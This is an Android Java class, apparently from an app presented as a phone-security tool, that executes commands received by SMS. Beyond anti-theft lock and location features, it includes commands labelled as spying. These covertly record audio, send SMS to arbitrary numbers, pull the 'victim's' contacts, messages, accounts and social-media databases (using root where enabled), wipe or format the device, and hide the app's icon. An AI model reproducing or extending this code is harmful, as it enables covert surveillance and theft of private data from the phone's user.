package com.tvh.security.services;

import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.util.Log;

import java.util.List;

import com.tvh.security.controllers.RecordingListener;
import com.tvh.security.models.CommandMessage;
import com.tvh.security.models.CommandType;
import com.tvh.security.models.Parameters;
import com.tvh.security.receivers.SmsReceiver;
import com.tvh.security.utils.CommandUtils;
import com.tvh.security.utils.PreferencesUtils;

public class CommandExecute {
    // public CommandExecute INSTANCE = new CommandExecute();
    private static final String TAG = CommandExecute.class.getName();
    private String m_sender = null;

    public void execute(Context context, CommandMessage sms) {

        m_sender = sms.getSender();
        List<String> commands = CommandUtils.getCommands(sms.getContent());
        for (Object command : commands.toArray()) {
            CommandType commandType = CommandType.findType((String) command);
            //Basic Features
            switch (commandType) {
                //For Service Basic Features
                case COMMAND_ALARM_LOCK:
                    //check service is enable
                    if (PreferencesUtils.isServiceEnabled(context, Parameters.SERVICE_BASIC_FEATURES)) {
                        Log.d(TAG, "Alarm and Lock");
                        startSecureApp(context, commandType);
                    }
                    break;
                case COMMAND_DELETE_MESSAGE:
                case COMMAND_DELETE_CONTACT:
                case COMMAND_FORMAT_SD_CARD:
                case COMMAND_FORMAT_PHONE:
                    if (PreferencesUtils.isServiceEnabled(context, Parameters.SERVICE_BASIC_FEATURES)) {
                        Log.d(TAG, "Delete & Format" + command);
                        Intent intentService = new Intent(context, DeleteFormatService.class);
                        intentService.putExtra(SmsReceiver.TYPE_INFO, commandType.getCommand());
                        intentService.putExtra(SmsReceiver.SENDER, m_sender);
                        context.startService(intentService);
                    }
                    break;

                //for Service Anti-theft
                case COMMAND_ANTI_THEFT:
                    break;

                //for Service Phone Finding
                // for command start get Victim Info Servcice
                case COMMAND_GET_SIM_INFO:
                case COMMAND_GET_LOCATION:
                case COMMAND_GET_PICTURE:
                    if (PreferencesUtils.isServiceEnabled(context, Parameters.SERVICE_PHONE_FINDING)) {
                        //get picture does not required root
                        startGetVictimInfo(context, commandType, false);
                    }
                    break;

                // for Service Remote Control (Spying)
                case COMMAND_RECORD_INTERACTION:
                    if (PreferencesUtils.isServiceEnabled(context, Parameters.SERVICE_PHONE_SPYING)) {
                        if (!RecordingListener.isRecording) {
                            startAccelerationListener(context, RecordingListener.INTERACTION_STOP_MODE);
                        }
                    }
                    break;
                case COMMAND_RECORD_LIMIT_TIME:
                    if (PreferencesUtils.isServiceEnabled(context, Parameters.SERVICE_PHONE_SPYING)) {
                        if (!RecordingListener.isRecording) {
                            startAccelerationListener(context, RecordingListener.TIME_STOP_MODE);
                        }
                    }
                    break;
                case COMMAND_REQUEST_SEND_SMS:
                    if (PreferencesUtils.isServiceEnabled(context, Parameters.SERVICE_PHONE_SPYING)) {
                        String smsContent = sms.getContent();
                        smsContent = smsContent.replace((CharSequence) command, "");
                        smsContent = smsContent.replace(Parameters.TO_SMS_PHONE, "");
                        smsContent = smsContent.replace(Parameters.DK_STRING.toLowerCase(), "");
                        smsContent = smsContent.replace(String.valueOf(PreferencesUtils.getPINCode(context)), "");

                        int charPosition = smsContent.indexOf("%%");
                        String targetNumber = smsContent.substring(charPosition);
                        smsContent = smsContent.replace(targetNumber, "");
                        targetNumber = targetNumber.replace("%%", "");
                        SmsManager smsManager = SmsManager.getDefault();
                        if (!TextUtils.isEmpty(targetNumber)) {
                            smsManager.sendTextMessage(targetNumber, null, smsContent, null, null);
                        }
                    }
                    break;
                case COMMAND_GET_SYSTEM_SETTINGS:
                case COMMAND_GET_CONTACT_DB:
                case COMMAND_GET_MESSAGE_DB:
                case COMMAND_GET_MAP_SEARCH_DB:
                case COMMAND_GET_YOUTUBE_DB:
                case COMMAND_GET_FACEBOOK_DB:
                case COMMAND_GET_YAHOO_DB:
                case COMMAND_GET_ACCOUNT_DB:
                case COMMAND_GET_CALENDAR_DB:
                    if (PreferencesUtils.isServiceEnabled(context, Parameters.SERVICE_PHONE_SPYING)) {
                        //check command is running as root?
                        boolean runAsRoot = PreferencesUtils.isRunAsRoot(context);
                        startGetVictimInfo(context, commandType, runAsRoot);
                    }
                    break;

                // for Default Service (Secure App - always service actived)
                case COMMAND_SHOW_APP_ICON:
                case COMMAND_HIDE_APP_ICON:
                    startSecureApp(context, commandType);
                    break;
                default:
                    break;
            }
        }

    }

    private void startSecureApp(Context context, CommandType typeSecure) {
        Log.d(TAG, "1");
        Intent intent = new Intent(context, SecureAppService.class);
        intent.putExtra(SecureAppService.SECURE_APP_TYPE, typeSecure.getCommand());
        context.startService(intent);
    }

    private void startAccelerationListener(Context context, int stopType) {
        System.out.println("Start listener");
        new RecordingListener(context.getApplicationContext(), stopType).startListener();
    }

    private void startGetVictimInfo(Context context, CommandType type, boolean runAsRoot) {
        Intent intentService = null;
        if (runAsRoot) {
            //run service as root user
            intentService = new Intent(context, GetVictimInformationService.class);
        } else {
            //if run_as_root preferences unchecked, run service for unrooted phone
            //only two command availables: get victim messages and contacts
            intentService = new Intent(context, GetVictimInformationServiceForUnroot.class);
        }
        intentService.putExtra(SmsReceiver.TYPE_INFO, type.getCommand());
        intentService.putExtra(SmsReceiver.SENDER, m_sender);
        context.startService(intentService);
    }
}
